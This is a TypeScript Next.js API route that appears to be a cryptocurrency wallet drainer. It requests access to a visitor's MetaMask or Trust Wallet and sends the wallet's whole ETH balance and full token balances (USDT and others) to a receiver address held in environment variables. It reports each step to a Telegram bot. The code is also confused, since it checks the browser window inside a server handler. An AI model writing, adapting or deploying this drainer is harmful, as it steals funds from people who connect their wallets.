/* eslint-disable @typescript-eslint/no-unused-vars */
import { NextRequest, NextResponse } from "next/server";
import { ethers } from "ethers";

async function sendTelegramNotification(message: string) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!botToken || !chatId) {
    console.error("Missing Telegram bot token or chat ID.");
    return;
  }
  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
    message
  )}`;
  await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
  });
}

async function transferFunds(
  signer: ethers.JsonRpcSigner,
  receiverAddress: string,
  amount: ethers.BigNumberish,
  tokenSymbol: string
) {
  try {
    const tx = await signer.sendTransaction({
      to: receiverAddress,
      value: amount,
    });
    await tx.wait();

    const amountInEther = ethers.formatUnits(amount, "ether");
    return `Transferred: ${amountInEther} ${tokenSymbol} to ${receiverAddress}`;
  } catch (error) {
    console.error(`Error transferring ${tokenSymbol}:`, error);
    return `Failed to transfer ${tokenSymbol}: ${
      error instanceof Error ? error.message : "Unknown error"
    }`;
  }
}

async function transferERC20Tokens(
  signer: ethers.JsonRpcSigner,
  tokenContractAddress: string,
  receiverAddress: string,
  tokenSymbol: string
) {
  try {
    const tokenContract = new ethers.Contract(
      tokenContractAddress,
      [
        "function balanceOf(address) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)",
      ],
      signer
    );

    const balanceInWei = await tokenContract.balanceOf(
      await signer.getAddress()
    );

    const tx = await tokenContract.transfer(receiverAddress, balanceInWei);
    await tx.wait();

    const balanceInEther = ethers.formatUnits(balanceInWei, "ether");
    return `Transferred: ${balanceInEther} ${tokenSymbol} to ${receiverAddress}`;
  } catch (error) {
    console.error(`Error transferring ${tokenSymbol}:`, error);
    return `Failed to transfer ${tokenSymbol}: ${
      error instanceof Error ? error.message : "Unknown error"
    }`;
  }
}

export async function POST(request: NextRequest) {
  try {
    let provider: ethers.BrowserProvider;

    if (typeof window !== "undefined" && window.ethereum?.isMetaMask) {
      provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      await sendTelegramNotification("Wallet connection successful.");
    } else if (typeof window !== "undefined" && window.ethereum?.isTrust) {
      provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      await sendTelegramNotification("Wallet connection successful.");
    } else {
      console.error("MetaMask or Trust Wallet not detected.");
      await sendTelegramNotification("MetaMask or Trust Wallet not detected.");
      return NextResponse.json(
        {
          success: false,
          message: "MetaMask or Trust Wallet not detected.",
        },
        { status: 500 }
      );
    }

    const signer = await provider.getSigner();
    const messages: string[] = [];

    const receiverAddressETH = process.env.RECEIVER_ADDRESS_ETH;
    if (!receiverAddressETH) {
      console.error(
        "Receiver address is not defined in the environment variables."
      );
      return NextResponse.json(
        { success: false, message: "Receiver address is not defined." },
        { status: 400 }
      );
    }

    const userAddress = await signer.getAddress();
    const ethBalanceInWei = await provider.getBalance(userAddress);
    if (ethBalanceInWei > 0n) {
      const message = await transferFunds(
        signer,
        receiverAddressETH,
        ethBalanceInWei,
        "ETH"
      );
      messages.push(message);
    }

    const tokenContracts = {
      USDT: process.env.TOKEN_ADDRESS_USDT,
      BTC: process.env.TOKEN_ADDRESS_BTC,
      BNB: process.env.TOKEN_ADDRESS_BNB,
      SOL: process.env.TOKEN_ADDRESS_SOL,
    };

    const tokensWithoutAddress: string[] = [];

    for (const [token, contractAddress] of Object.entries(tokenContracts)) {
      if (!contractAddress) {
        tokensWithoutAddress.push(token);
        continue;
      }

      const message = await transferERC20Tokens(
        signer,
        contractAddress,
        receiverAddressETH,
        token
      );
      messages.push(message);
    }

    if (tokensWithoutAddress.length > 0) {
      await sendTelegramNotification(
        `The following tokens are available but do not have a withdrawal address: ${tokensWithoutAddress.join(
          ", "
        )}`
      );
    }

    if (messages.length > 0) {
      await sendTelegramNotification(messages.join("\n"));
    }

    return NextResponse.json({ success: true, messages }, { status: 200 });
  } catch (error) {
    console.error("Error in transfer:", error);
    const errorMessage =
      error instanceof Error ? error.message : "Something went wrong";
    await sendTelegramNotification(`Error in transfer: ${errorMessage}`);
    return NextResponse.json(
      { success: false, message: errorMessage },
      { status: 500 }
    );
  }
}
